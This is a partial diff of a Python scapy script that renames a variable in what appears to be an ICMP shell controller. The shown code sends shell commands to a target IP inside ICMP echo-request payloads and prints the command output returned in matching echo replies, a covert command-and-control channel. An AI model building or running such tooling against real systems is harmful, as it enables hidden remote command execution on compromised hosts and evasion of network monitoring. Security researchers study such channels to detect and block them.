@@ -7,7 +7,7 @@ from multiprocessing import Process
 import argparse
 
 #Variables
-icmp_id = int(13170)
+ICMP_ID = int(13170)
 TTL = int(64)
 
 def check_scapy():
@@ -25,7 +25,7 @@ def sniffer():
     sniff(iface=args.interface, prn=shell, filter="icmp", store="0")
 
 def shell(pkt):
-    if pkt[IP].src == args.destination_ip and pkt[ICMP].type == 0 and pkt[ICMP].id == icmp_id and pkt[Raw].load:
+    if pkt[IP].src == args.destination_ip and pkt[ICMP].type == 0 and pkt[ICMP].id == ICMP_ID and pkt[Raw].load:
         icmppacket = (pkt[Raw].load).decode('utf-8', errors='ignore').replace('\n','')
         print(icmppacket)
     else:
@@ -44,7 +44,7 @@ def main():
         elif icmpshell == '':
             pass
         else:
-            payload = (IP(dst=args.destination_ip, ttl=TTL)/ICMP(type=8,id=icmp_id)/Raw(load=icmpshell))
+            payload = (IP(dst=args.destination_ip, ttl=TTL)/ICMP(type=8,id=ICMP_ID)/Raw(load=icmpshell))
             sr(payload, timeout=0, verbose=0)
     sniffing.join()
 
